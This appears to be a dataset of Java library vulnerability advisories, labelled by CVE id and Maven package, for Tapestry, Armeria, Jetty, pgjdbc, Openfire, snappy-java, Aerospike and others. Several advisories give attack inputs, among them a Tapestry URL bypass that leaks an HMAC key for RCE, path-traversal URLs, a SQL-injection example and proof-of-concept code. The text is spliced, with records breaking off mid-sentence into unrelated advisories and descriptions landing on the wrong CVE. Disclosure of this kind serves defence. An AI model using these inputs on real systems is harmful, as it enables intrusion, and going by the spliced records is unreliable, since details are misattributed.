Recap: Before the fix of CVE-2019-0195 it was possible to download arbitrary class files from the classpath by providing a crafted asset file URL. An attacker was able to download the file `AppModule.class` by requesting the URL `http://localhost:8080/assets/something/services/AppModule.class` which contains a HMAC secret key. The fix for that bug was a blacklist filter that checks if the URL ends with `.class`, `.properties` or `.xml`. Bypass: Unfortunately, the blacklist solution can simply be bypassed by appending a `/` at the end of the URL: `http://localhost:8080/assets/something/services/AppModule.class/` The slash is stripped after the blacklist check and the file `AppModule.class` is loaded into the response. This class usually contains the HMAC secret key which is used to sign serialized Java objects. With the knowledge of that key an attacker can sign a Java gadget chain that leads to RCE (e.g. CommonsBeanUtils1 from ysoserial).

This cannot prevent access to files Opencast needs to read though and we highly recommend updating.\n\n### References\n\n-  [Example of problematic code](https://github.com/opencast/opencast/blob/69952463971cf578363e3b97d8edaf334ff51253/modules/ingest-service-impl/src/main/java/org/opencastproject/ingest/impl/IngestServiceImpl.java#L1587).\n- [Patch fixing the issue](https://github.com/opencast/opencast/commit/65c46b9d3e8f045c544881059923134571897764)\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [our issue tracker](https://github.com/opencast/opencast/issues)\n* Email us at [security@opencast.org](mailto:security@opencast.org)\n", "labels": ["org.opencastproject:opencast-ingest-service-impl"]}, {"cve_id": "CVE-2020-35215", "desc": "An issue in Atomix v3.1.5 allows attackers to access sensitive information when a malicious Atomix node queries distributed variable primitives which contain the entire primitive lists that ONOS nodes use to share important states.", "labels": ["io.atomix:atomix"]}, {"cve_id": "CVE-2020-35210", "desc": "A vulnerability in Atomix v3.1.5 allows attackers to cause a denial of service (DoS) via a Raft session flooding attack using Raft OpenSessionRequest messages.", "labels": ["io.atomix:atomix"]}, {"cve_id": "CVE-2020-35211", "desc": "An issue in Atomix v3.1.5 allows unauthorized Atomix nodes to become the lead node in a target cluster via manipulation of the variable terms in RaftContext.", "labels": ["io.atomix:atomix"]}, {"cve_id": "CVE-2021-43795", "desc": "### Impact\n\nAn attacker can access an Armeria server's local file system beyond its restricted directory by sending an HTTP request whose path contains `%2F` (encoded `/`), such as `/files/..%2Fsecrets.txt`, bypassing Armeria's path validation logic.\n\n### Patches\n\nArmeria 1.13.4 or above contains the hardened path validation logic that handles `%2F` properly. \n\n### Workarounds\n\nThis vulnerability can be worked around by inserting a decorator that performs an additional validation on the request path, e.g.\n\n```java\nServer\n  .builder()\n  .serviceUnder(\n    \"/files\",\n    FileService\n      .of(...)\n      .decorate((delegate, ctx, req) -> {\n        String path = req.headers().path();\n        if (path.contains(\"%2f\") || path.contains(\"%2F\")) {\n          return HttpResponse.of(HttpStatus.BAD_REQUEST);\n        }\n        return delegate.serve(ctx, req);\n      })\n  )\n  .build()\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [line/armeria](https://github.com/line/armeria)\n* Chat with us at [Slack](https://armeria.dev/s/slack)\n\n### Credits\n\nThis vulnerability was originally reported by Abdallah Zaher ([elcayser-0x0a](https://hackerone.com/elcayser-0x0a?type=user)).", "labels": ["com.linecorp.armeria:armeria"]}, {"cve_id": "CVE-2020-35213", "desc": "An issue in Atomix v3.1.5 allows attackers to cause a denial of service (DoS) via false link event messages sent to a master ONOS node.", "labels": ["io.atomix:atomix"]}, {"cve_id": "CVE-2020-35216", "desc": "An issue in Atomix v3.1.5 allows attackers to cause a denial of service (DoS) via false member down event messages.", "labels": ["io.atomix:atomix"]}, {"cve_id": "CVE-2021-22095", "desc": "In Spring AMQP versions 2.2.0 - 2.2.19 and 2.3.0 - 2.3.11, the Spring AMQP Message object, in its toString() method, will create a new String object from the message body, regardless of its size.

A single request can easily consume minutes of CPU time before it is even dispatched to the application.\n\nThe only features within Jetty that can trigger this behavior are:\n\n- Default Error Handling - the `Accept` request header with the `QuotedQualityCSV` is used to determine what kind of content to send back to the client (html, text, json, xml, etc)\n- `StatisticsServlet` - uses the `Accept` request header with the `QuotedQualityCSV` to determine what kind of content to send back to the client (xml, json, text, html, etc)\n- `HttpServletRequest.getLocale()` - uses the `Accept-Language` request header with the `QuotedQualityCSV` to determine which \u201cpreferred\u201d language is returned on this call.\n- `HttpservletRequest.getLocales()` - is similar to the above, but returns an ordered list of locales based on the quality values on the `Accept-Language` request header.\n- `DefaultServlet` - uses the `Accept-Encoding` request header with the `QuotedQualityCSV` to determine which kind of pre-compressed content should be sent back for static content (content that is not matched against a url-pattern in your web app)\n\n### Versions\n`QuotedQualityCSV` was introduced to Jetty 9.3.9.v20160517 and the bug that introduced the vulnerability was in 9.4.6.v20170531. \n\nCurrently, known vulnerable versions include:\n\n- 9.4.6.v20170531 thru to 9.4.36.v20210114\n- 10.0.0\n- 11.0.0\n\n### Workarounds\n\nQuality ordered values are used infrequently by jetty so they can be avoided by:\n\n * Do not use the default error page/handler.\n * Do not deploy the `StatisticsServlet` exposed to the network\n * Do not call `getLocale` API\n * Do not enable precompressed static content in the `DefaultServlet` \n\n### Patches\n\nAll patches are available for download from the Eclipse Jetty website at [https://www.eclipse.org/jetty/download.php](https://www.eclipse.org/jetty/download.php)\n- 9.4.37.v20210219 and greater\n- 10.0.1 and greater \n- 11.0.1 and greater", "labels": ["org.eclipse.jetty:jetty-server", "org.eclipse.jetty:jetty-server", "org.eclipse.jetty:jetty-server"]}, {"cve_id": "CVE-2021-21363", "desc": "### Impact\n\nOn Unix like systems, the system's temporary directory is shared between all users on that system.

This can be done using the new [`SessionModule.allowTypes()`](https://ratpack.io/manual/1.9.0/api/ratpack/session/SessionModule.html#allowTypes(com.google.inject.Binder,java.lang.Class...)) method. Please see its documentation for details...))\n\n### Patches\n\nRatpack 1.9.0 introduces a strict allow-list mechanism that mitigates this vulnerability when used.\n\n### Workarounds\n\nThe simplest mitigation for users of earlier versions is to reduce the likelihood of attackers being able to write to the session data store. \n\nAlternatively or additionally, the allow-list mechanism could be manually back ported by providing an alternative implementation of `SessionSerializer` that uses an allow-list.\n\n### References\n\n - https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/\n - https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data\n", "labels": ["io.ratpack:ratpack-core"]}, {"cve_id": "CVE-2021-29481", "desc": "### Impact\n\nThe default configuration of client side sessions results in unencrypted, but signed, data being set as cookie values.

The verify method in `IdTokenVerifier` does not validate the signature before verifying the claims (e.g., iss, aud, etc.). Signature verification makes sure that the token's payload comes from valid provider, not from someone else.\n\nAn attacker can provide a compromised token with modified payload like email or phone number. The token will pass the validation by the library. Once verified, modified payload can be used by the application. \n\nIf the application sends verified `IdToken` to other service as is like for auth - the risk is low, because the backend of the service is expected to check the signature and fail the request. \n\nReporter: [Tamjid al Rahat](https://github.com/tamjidrahat), contributor\n\n### Patches\nThe issue was fixed in the 1.33.3 version of the library\n\n### Proof of Concept\nTo reproduce, one needs to call the verify function with an IdToken instance that contains a malformed signature to successfully bypass the checks inside the verify function.\n\n```\n  /** A default http transport factory for testing */\n  static class DefaultHttpTransportFactory implements HttpTransportFactory {\n    public HttpTransport create() {\n      return new NetHttpTransport();\n    }\n  }\n\n// The below token has some modified bits in the signature\n private static final String SERVICE_ACCOUNT_RS256_TOKEN_BAD_SIGNATURE =    \n\"eyJhbGciOiJSUzI1NiIsImtpZCI6IjJlZjc3YjM4YTFiMDM3MDQ4NzA0MzkxNmFjYmYyN2Q3NG\" +\n\"VkZDA4YjEiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOiJodHRwczovL2V4YW1wbGUuY29tL2F1ZGllbm\" +\n\"NlIiwiZXhwIjoxNTg3NjMwNTQzLCJpYXQiOjE1ODc2MjY5NDMsImlzcyI6InNvbWUgaXNzdWVy\" +\n\"Iiwic3ViIjoic29tZSBzdWJqZWN0In0.gGOQW0qQgs4jGUmCsgRV83RqsJLaEy89-ZOG6p1u0Y26\" +\n\"FyY06b6Odgd7xXLsSTiiSnch62dl0Lfi9D0x2ByxvsGOCbovmBl2ZZ0zHr1wpc4N0XS9lMUq5RJ\" + \n\"QbonDibxXG4nC2zroDfvD0h7i-L8KMXeJb9pYwW7LkmrM_YwYfJnWnZ4bpcsDjojmPeUBlACg7tjjOgBFby\" +\n\"QZvUtaERJwSRlaWibvNjof7eCVfZChE0PwBpZc_cGqSqKXv544L4ttqdCnm0NjqrTATXwC4gYx\" + \n\"ruevkjHfYI5ojcQmXoWDJJ0-_jzfyPE4MFFdCFgzLgnfIOwe5ve0MtquKuv2O0pgvg\";\n\nIdTokenVerifier tokenVerifier =\n        new IdTokenVerifier.Builder()\n            .setClock(clock)\n            .setCertificatesLocation(\"https://www.googleapis.com/robot/v1/metadata/x509/integration-tests%40chingor-test.iam.gserviceaccount.com\")\n            .setHttpTransportFactory(new DefaultHttpTransportFactory())\n            .build();\n\n// verification will return true despite modified signature for versions <1.33.3\ntokenVerifier.verify(IdToken.parse(GsonFactory.getDefaultInstance(), SERVICE_ACCOUNT_RS256_TOKEN_BAD_SIGNATURE));\n\n```\n\n### Remediation and Mitigation\nUpdate to the version 1.33.3 or higher \n\nIf the library used indirectly or cannot be updated for any reason you can use similar IdToken verifiers provided by Google that already has signature verification. For example: \n[google-auth-library-java](https://github.com/googleapis/google-auth-library-java/blob/main/oauth2_http/java/com/google/auth/oauth2/TokenVerifier.java)\n[google-api-java-client](https://github.com/googleapis/google-api-java-client/blob/main/google-api-client/src/main/java/com/google/api/client/googleapis/auth/oauth2/GoogleIdTokenVerifier.java)\n\n### Timeline\nDate reported: 12 Dec 2021\nDate fixed: 13 Apr 2022\nDate disclosed: 2 May 2022\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in the [google-oauth-java-client](https://github.com/googleapis/google-oauth-java-client) repo", "labels": ["com.google.oauth-client:google-oauth-client"]}, {"cve_id": "CVE-2023-6484", "desc": "A flaw was found in keycloak 22.0.5.

Users that do not override the query mode are not impacted.\n\n# Exploitation\n\nTo exploit this behavior the following conditions must be met:\n\n1. A placeholder for a numeric value must be immediately preceded by a minus (i.e. `-`)\n1. There must be a second placeholder for a string value after the first placeholder on the same line. \n1. Both parameters must be user controlled.\n\nThe prior behavior of the driver when operating in simple query mode would inline the negative value of the first parameter and cause the resulting line to be treated as a `--` SQL comment. That would extend to the beginning of the next parameter and cause the quoting of that parameter to be consumed by the comment line. If that string parameter includes a newline, the resulting text would appear unescaped in the resulting SQL.\n\nWhen operating in the default extended query mode this would not be an issue as the parameter values are sent separately to the server. Only in simple query mode the parameter values are inlined into the executed SQL causing this issue.\n\n# Example\n\n```java\nPreparedStatement stmt = conn.prepareStatement(\"SELECT -?, ?\");\nstmt.setInt(1, -1);\nstmt.setString(2, \"\\nWHERE false --\");\nResultSet rs = stmt.executeQuery();\n```\n\nThe resulting SQL when operating in simple query mode would be:\n\n```sql\nSELECT --1,'\nWHERE false --'\n```\n\nThe contents of the second parameter get injected into the command. Note how both the number of result columns and the WHERE clause of the command have changed. A more elaborate example could execute arbitrary other SQL commands.\n\n# Patch\nProblem will be patched upgrade to 42.7.2, 42.6.1, 42.5.5, 42.4.4, 42.3.9, 42.2.28, 42.2.28.jre7\n\nThe patch fixes the inlining of parameters by forcing them all to be serialized as wrapped literals.

In some cases, it's still possible to exploit the vulnerability that was fixed in the new version. The severity of this depends on the fixed vulnerability, for the purpose of this advisory take [CVE-2022-36100](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2g5c-228j-p52x) as example - it is easily exploitable with just view rights and critical. When XWiki is upgraded from a version before the fix for it (e.g., 14.3) to a version including the fix (e.g., 14.4), the vulnerability can still be reproduced by adding `rev=1.1` to the URL used in the reproduction steps so remote code execution is possible even after upgrading. Therefore, this affects the confidentiality, integrity and availability of the whole XWiki installation. This vulnerability also affects manually added script macros that contained security vulnerabilities that were later fixed by changing the script macro without deleting the versions with the security vulnerability from the history.\n\nThis vulnerability doesn't affect freshly installed versions of XWiki. Further, this vulnerability doesn't affect content that is only loaded from the current version of a document like the code of wiki macros or UI extensions.\n\n### Patches\n\nThis vulnerability has been patched in XWiki 14.10.7 and 15.2RC1 by forcing old revisions to be executed in a restricted mode that disables all script macros.\n\n### Workarounds\n\nAs a workaround, admins can manually delete old revisions of affected documents. A script could be used to identify all installed documents and delete the history for them. However, also manually added and later corrected code may be affected by this vulnerability so it is easy to miss documents.\n\n### References\n\n* https://jira.xwiki.org/browse/XWIKI-20594\n* https://github.com/xwiki/xwiki-platform/commit/15a6f845d8206b0ae97f37aa092ca43d4f9d6e59", "labels": ["org.xwiki.platform:xwiki-platform-oldcore", "org.xwiki.platform:xwiki-platform-oldcore"]}, {"cve_id": "CVE-2023-2976", "desc": "Use of Java's default temporary directory for file creation in `FileBackedOutputStream` in Google Guava versions 1.0 to 31.1 on Unix systems and Android Ice Cream Sandwich allows other users and apps on the machine with access to the default Java temporary directory to be able to access the files created by the class.\n\nEven though the security vulnerability is fixed in version 32.0.0, maintainers recommend using version 32.0.1 as version 32.0.0 breaks some functionality under Windows.\n\n", "labels": ["com.google.guava:guava"]}, {"cve_id": "CVE-2023-35157", "desc": "### Impact\nIt's possible to perform an XSS by forging a request to a delete attachment action with a specific attachment name. \nNow this XSS can be exploited only if the attacker knows the CSRF token of the user, or if the user ignores the warning about the missing CSRF token. \n\n### Patches\n\nThe vulnerability has been patched in XWiki 15.1-rc-1 and XWiki 14.10.6.\n\n\n### Workarounds\n\nThere's no workaround for this other than upgrading XWiki. \n\n### References\n\n  * Jira ticket: https://jira.xwiki.org/browse/XWIKI-20339\n  * Commit containing the fix: https://github.com/xwiki/xwiki-platform/commit/35e9073ffec567861e0abeea072bd97921a3decf\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [Jira XWiki.org](https://jira.xwiki.org/)\n* Email us at [Security Mailing List](mailto:security@xwiki.org)", "labels": ["org.xwiki.platform:xwiki-platform-oldcore", "org.xwiki.platform:xwiki-platform-oldcore"]}, {"cve_id": "CVE-2023-35142", "desc": "Jenkins Checkmarx Plugin 2022.4.3 and earlier disables SSL/TLS validation for connections to the Checkmarx server by default.", "labels": ["com.checkmarx.jenkins:checkmarx"]}, {"cve_id": "CVE-2023-34620", "desc": "An issue was discovered hjson through 3.0.0 allows attackers to cause a denial of service or other unspecified impacts via crafted objects that deeply nested structures.", "labels": ["org.hjson:hjson"]}, {"cve_id": "CVE-2022-4361", "desc": "AssertionConsumerServiceURL is a Java implementation for SAML Service Providers (org.keycloak.protocol.saml).

The issue most likely won\u2019t occur when using a byte array, since creating a byte array of size 0x80000000 (or any other negative value) is impossible in the first place.\n\n\n## Steps To Reproduce\nCompile and run the following code:\n\n```java\npackage org.example;\nimport org.xerial.snappy.Snappy;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        char[] uncompressed = new char[0x40000000];\n        byte[] compressed = Snappy.compress(uncompressed);\n    }\n}\n\n```\n\nThe program will crash, creating crashdumps and showing the following error (or similar):\n\n```\n#\n# A fatal error has been detected by the Java Runtime Environment:\n#\n#  EXCEPTION_ACCESS_VIOLATION (0xc0000005) at pc=0x0000000063a01c20, pid=21164, tid=508\n#\n.......\n```\n\n\nAlternatively - compile and run the following code:\n\n```java\npackage org.example;\nimport org.xerial.snappy.Snappy;\n\nimport java.io.*;\n\npublic class Main {\n\n    public static void main(String[] args) throws IOException {\n        char[] uncompressed = new char[0x3fffffff];\n        byte[] compressed = Snappy.compress(uncompressed);\n    }\n}\n```\n\nThe program will crash with the following error (or similar), since the maxCompressedLength returns a value that is interpreted as negative by java:\n\n```\nException in thread \"main\" java.lang.NegativeArraySizeException: -1789569677\n\tat org.xerial.snappy.Snappy.rawCompress(Snappy.java:425)\n\tat org.xerial.snappy.Snappy.compress(Snappy.java:172)\n\tat org.example.Main.main(Main.java:10)\n\n```", "labels": ["org.xerial.snappy:snappy-java"]}, {"cve_id": "CVE-2023-35141", "desc": "Jenkins provides context menus for various UI elements, like links to jobs and builds, or breadcrumbs.\n\nIn Jenkins 2.399 and earlier, LTS 2.387.3 and earlier, POST requests are sent in order to load the list of context actions.

It does that by attempting to read 4 bytes. If it wasn\u2019t possible to read the 4 bytes, the function returns false. Otherwise, if 4 bytes were available, the code treats them as the length of the next chunk.\n\n\n\n```java\n        int readBytes = readNext(header, 0, 4);\n        if (readBytes < 4) {\n            return false;\n        }\n\n        int chunkSize = SnappyOutputStream.readInt(header, 0);\n        if (chunkSize == SnappyCodec.MAGIC_HEADER_HEAD) {\n            .........\n        }\n\n        // extend the compressed data buffer size\n        if (compressed == null || chunkSize > compressed.length) {\n            compressed = new byte[chunkSize];\n        }\n\n```\n\nIn the case that the \u201ccompressed\u201d variable is null, a byte array is allocated with the size given by the input data. Since the code doesn\u2019t test the legality of the \u201cchunkSize\u201d variable, it is possible to pass a negative number (such as 0xFFFFFFFF which is -1), which will cause the code to raise a \u201cjava.lang.NegativeArraySizeException\u201d exception.

This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users.\n\n### Cause\nPath traversal protections were already in place to protect against exactly this kind of attack, but didn\u2019t defend against certain non-standard URL encoding for UTF-16 characters, that were not supported by the embedded webserver that was in use at the time.\n\nA later upgrade of the embedded webserver included support for non-standard URL encoding of UTF-16 characters. The path traversal protections in place in Openfire were not updated to include protection against this new encoding. \n\nOpenfire's API defines a mechanism for certain URLs to be excluded from web authentication (this, for example, is used for the login page). This mechanism allows for wildcards to be used, to allow for flexible URL pattern matching.\n\nThe combination of the wildcard pattern matching and path traversal vulnerability allows a malicious user to bypass authentication requirements for Admin Console pages.\n\n### Affected versions\nThis vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0).\n\n### Problem Reproduction\nTo test if an instance of Openfire is affected, follow these steps. Open a browser in incognito mode, or otherwise ensure that there is no authenticated session with the Openfire admin console. Open the following URL (possibly modified for the hostname of the server that is running Openfire):\n\n```http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp```\n\nIf this shows part of the openfire logfiles, then the instance of Openfire is affected by this vulnerability. Note that different versions of Openfire will show a different layout. Newer versions of Openfire can be expected to show log files on a dark background, while older versions will show a largely white page. (Depending on the content of the log file, this page might be empty, apart from a header!)\n\nIf there's a redirect to the login page, the instance is likely unaffected.\n\n### Problem Resolution\nThe problem has been patched in [Openfire release 4.7.5 and 4.6.8](https://www.igniterealtime.org/downloads/#openfire), and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0).\n\n- In Openfire 4.6.8, 4.7.5 and 4.8.0, Path Traversal pattern detection has been improved to include detection of non-standard URL encodings, preventing any non UTF-8 characters.\n- In Openfire 4.6.8, 4.7.5 and 4.8.0, a new configuration property (`adminConsole.access.allow-wildcards-in-excludes`) is introduced that controls the permissibility of using wildcards in URL-patterns that define exclusions to authentication.\n- In Openfire 4.6.8, 4.7.5 and 4.8.0, the existing value that uses a wildcard in URL-patterns that define exclusions to authentication has been replaced by values that do not depend on a wildcard.\n- In Openfire 4.6.8, 4.7.5 and 4.8.0, Setup-specific URL-patterns that define exclusions to authentication are no longer active after the setup process has finished.\n- In Openfire 4.8.0, the embedded webserver will be updated to a version that no longer supports the non-standard URL encoding of UTF-16 characters.\n- In Openfire 4.8.0, the embedded webserver that serves the Openfire administrative console will bind to the loopback network interface by default.\n\nBe aware that the new configuration properties can interfere with the functionality of certain Openfire plugins. This is especially true for plugins that bind a (web)endpoint to the embedded webserver that serves the Openfire administrative console, like current versions of the REST API plugin do. For these plugins to remain functional and/or reachable, it might be required to toggle the property `adminConsole.access.allow-wildcards-in-excludes` to `true`, and to avoid binding the embedded webserver to the loopback network interface only.\n\nWhen your server uses older versions of the following plugins, make sure to upgrade them:\n\n- [Random Avatar plugin](https://www.igniterealtime.org/projects/openfire/plugin-archive.jsp?plugin=randomavatar), update to version 1.1.0 or later.\n- [Monitoring Service plugin](https://www.igniterealtime.org/projects/openfire/plugin-archive.jsp?plugin=monitoring), update to version 2.5.0 or later.\n- [HTTP File Upload plugin](https://www.igniterealtime.org/projects/openfire/plugin-archive.jsp?plugin=httpfileupload), update to version 1.3.0 or later.\n\n### Mitigation\nIf an Openfire upgrade isn\u2019t available for your release, or isn\u2019t quickly actionable, you can take any of the following steps to mitigate the risk for your Openfire environment.\n\nBe aware: through Openfire plugins, the effectiveness of some mitigations listed below can be reduced, while other mitigations might affect the functionality of plugins. Particular care should be taken when using the Monitoring Service plugin, REST API plugin, User Service plugin and/or Random Avatar plugin.\n\n#### Restrict network access\nUse network security measures (network ACLs and/or firewalls, VPNs) to ensure only trusted members of your community have access to the Openfire Admin Console. As a general rule, never expose the Openfire Admin Console to the general internet.\n\nExamples:\n* On a linux machine running `ufw`, deny ports 9090 and 9091 on non-loopback interfaces\n* On a Windows machine, restrict the rules that open ports 9090 and 9091 to only allow traffic from the IPv4 and/or IPv6 loopback addresses\n* On AWS cloud infrastructure, use EC2 Security Groups to restrict ports 9090 and 9091 to trusted IP addresses. If the trusted range is necessarily too broad, consider opening and closing the ports only as necessary\n* If using Docker, instead of `docker run ... -p 5222:5222 -p 9090:9090 -p 9091:9091 openfire` prevent remote access to the Admin Console with `docker run ... -p 5222:5222 -p 127.0.0.1:9090:9090 -p 127.0.0.1:9091:9091 openfire`\n\n\n#### Modify runtime configuration file\nTo close the avenue of potential attack, a runtime configuration file of Openfire can be modified.\n\nIn Openfire's installation directory, find the file `plugins/admin/webapp/WEB-INF/web.xml`. After creating a backup of this file, edit the original file.\n\nThe content of this file is XML. Find a `<filter>` element, that contains the `<filter-name>AuthCheck</filter-name>` child element. Depending on your version of Openfire, it will look similar to this:\n\n```xml\n<filter>\n    <filter-name>AuthCheck</filter-name>\n    <filter-class>org.jivesoftware.admin.AuthCheckFilter</filter-class>\n    <init-param>\n        <param-name>excludes</param-name>\n        <param-value>\n            login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp\n        </param-value>\n    </init-param>\n</filter>\n```\nThe value inside of the `param-value` element is a comma-separated list of values. From this list, remove all `*` (asterisk) characters.\n\nSave the file, and restart Openfire for the change to take effect.\n\nNote that no guarantees can be given that this runtime configuration change persists over time. Ensure to monitor the presence of the fix. It is recommended to upgrade to a safe version of Openfire as soon as possible.\n\nA side-effect of this change is that the Openfire web-based setup wizard will not function properly (functionality can be restored by reverting the change). This wizard is typically used only when initially installing Openfire.\n\n#### Bind admin console to loopback interface\nThe Openfire admin console is a web-based application. By default, the corresponding webserver (that is embedded in Openfire) binds to all network interfaces of the host that it is running on.\n\nThe admin console can be configured to bind to a specific network interface. This will prevent it from being accessed through other network interfaces. By configuring the admin console to bind to the local loopback interface, it is accessible only to users on the server itself. This reduces the avenue of attack.\n\nNote that several Openfire plugins expose part or all of their functionality through the admin console webserver. The REST API plugin, for example, serves its endpoints via this webserver. Availability of this functionality will be affected by binding the webserver to a specific network interface.\n\nTo bind the webserver of the Openfire admin console to a specific network interface, the 'openfire.xml' configuration file can be used.\n\nIn Openfire's installation directory, locate the file `conf/openfire.xml`. After creating a backup of this file, edit the original file.\n\nThe content of this file is XML. Find the `<adminConsole>` element that is a direct child element of the root `<jive>` element. Add a new element, named `<interface>` as a child element of `<adminConsole>`. The value of the `<interface>` element should be the name of the loopback interface or interface address. Setting value to `127.0.0.1` works on all tested environments (using values like  `lo` on most Linux systems or `lo0` on macOS will have the same effect).\n\nThe resulting fragment of the `openfire.xml` file will look similar to this:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<jive>\n  <adminConsole>\n      <interface>127.0.0.1</interface>\n      <port>9090</port>\n      <securePort>9091</securePort>\n  </adminConsole>\n\n  ...\n```\n\nSave the file, and restart Openfire for the change to take effect.\n\n#### Use AuthFilterSanitizer plugin\n\nThe Ignite Realtime community has made available a new plugin, called the AuthFilterSanitizer plugin. The plugin can be installed from the Openfire admin console, or can be downloaded from [the plugin's archive page](https://www.igniterealtime.org/projects/openfire/plugin-archive.jsp?plugin=authfiltersanitizer) on the IgniteRealtime.org community website.\n\nThis plugin periodically removes entries for Openfire's authentication filter that are susceptible to abuse, closing the avenue of potential attack.\n\nNote that this plugin might interfere with functionality that depends on the abuse-susceptible entries in the authentication filter that might be provided by plugins.\n\n### Credit\n\nThis issue was originally reported by Siebene@ who has our gratitude for the responsible and detailed disclosure of the issue! \n\nWe are grateful for the resources made available by Surevine ltd.

Also it would be useful to make AntiSamy remove the `noscript` tag by adding this in your tag definitions under the `<tagrules>` node (or deleting it entirely if present):\n```xml\n<tag name=\"noscript\" action=\"remove\"/>\n```\n\nAs the previously mentioned policy settings are preconditions for the mXSS attack to work, changing them as recommended should be sufficient to protect you against this vulnerability when using a vulnerable version of this library.

Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.\n\n## Product\n\nAerospike Java Client\n\n## Tested Version\n\n[6.1.7](https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7)\n\n## Details\n\n### Issue: Unsafe deserialization of server responses (`GHSL-2023-044`)\n\nThe Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the `NettyCommand` class. This class includes an `InboundHandler` that extends Netty's `ChannelInboundHandlerAdapter`, which handles inbound data coming from the Netty channel established with the server. This is implemented in the `channelRead` method:\n\n[`client/src/com/aerospike/client/async/NettyCommand.java:1157`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157)\n\n```java\n@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    command.read((ByteBuf)msg);\n}\n```\n\nThe incoming `msg` object is handled by the `NettyCommand.read` method, which behaves differently depending on the `state` variable. Several states produce paths to the vulnerable code \u2014 for instance, we will follow the path through `AsyncCommand.COMMAND_READ_HEADER`:\n\n[`/client/src/com/aerospike/client/async/NettyCommand.java:489`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489)\n\n```java\nprivate void read(ByteBuf byteBuffer) {\n    eventReceived = true;\n\n    try {\n        switch (state) {\n            // --snip--\n            case AsyncCommand.COMMAND_READ_HEADER:\n                if (command.isSingle) {\n                    readSingleHeader(byteBuffer);\n                }\n                // --snip--\n        }\n        // --snip--\n    }\n    // --snip---\n}\n```\n\nSome bytes are read from the message buffer and saved in `command.dataBuffer` in the `readSingleHeader` method, after which `parseSingleBody` is called:\n\n[`client/src/com/aerospike/client/async/NettyCommand.java:596`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596)\n\n```java\nprivate void readSingleHeader(ByteBuf byteBuffer) {\n    int readableBytes = byteBuffer.readableBytes();\n    int dataSize = command.dataOffset + readableBytes;\n\n    // --snip--\n\n    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);\n    command.dataOffset = dataSize;\n\n    if (command.dataOffset >= receiveSize) {\n        parseSingleBody();\n    }\n}\n```\n\n`parseSingleBody` simply delegates on `AsyncCommand.parseCommandResult`, which unless the message is compressed, directly calls `AsyncCommand.parseResult`. The implementation of this method depends on the command type. For an `AsyncRead` command, we have the following:\n\n[`client/src/com/aerospike/client/async/AsyncRead.java:68`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68)\n\n```java\n@Override\nprotected final boolean parseResult() {\n    validateHeaderSize();\n\n    int resultCode = dataBuffer[dataOffset + 5] & 0xFF;\n    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);\n    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);\n    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);\n    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);\n    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;\n\n    if (resultCode == 0) {\n        // --snip--\n        skipKey(fieldCount);\n        record = parseRecord(opCount, generation, expiration, isOperation);\n        return true;\n    }\n```\n\nIt can be seen that several fields are read from the message's bytes, and then a call to `Command.parseRecord` happens:\n\n[`client/src/com/aerospike/client/command/Command.java:2083`](https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083)\n\n```java\nprotected final Record parseRecord(\n    int opCount,\n    int generation,\n    int expiration,\n    boolean isOperation\n)  {\n    Map<String,Object> bins = new LinkedHashMap<>();\n\n    for (int i = 0 ; i < opCount; i++) {\n        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);\n        byte particleType = dataBuffer[dataOffset + 5];\n        byte nameSize = dataBuffer[dataOffset + 7];\n        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);\n        dataOffset += 4 + 4 + nameSize;\n\n        int particleBytesSize = opSize - (4 + nameSize);\n        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);\n```\n\n`Buffer.bytesToParticle` converts the remaining bytes in the data buffer depending on the `particleType` field. We're interested in the `JBLOB` 